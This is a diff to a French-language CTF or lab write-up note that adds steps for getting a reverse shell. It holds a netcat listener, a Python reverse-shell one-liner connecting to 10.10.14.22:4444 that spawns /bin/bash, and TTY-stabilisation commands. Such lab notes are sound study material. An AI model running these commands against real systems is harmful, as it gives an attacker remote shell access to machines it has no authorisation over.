@@ -64,12 +64,28 @@ Finished
 
 ##### Do a reverse shell to be more confortable : 
 
-Terminal 1 ":"
+Terminal 1 :
+
+```
+nc -lnvp 4444
+```
 
 Terminal : 2 
 
 ![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260311025619.png)
 
 ```
-python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("TON_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.22",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
 ```
+
+
+#### TTY : 
+
+- `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+    
+- Fais **Ctrl+Z** (pour mettre le shell en arrière-plan).
+    
+- Tape `stty raw -echo; fg` puis appuie sur **Entrée** deux fois.
+    
+- Tape `export TERM=xterm`
+
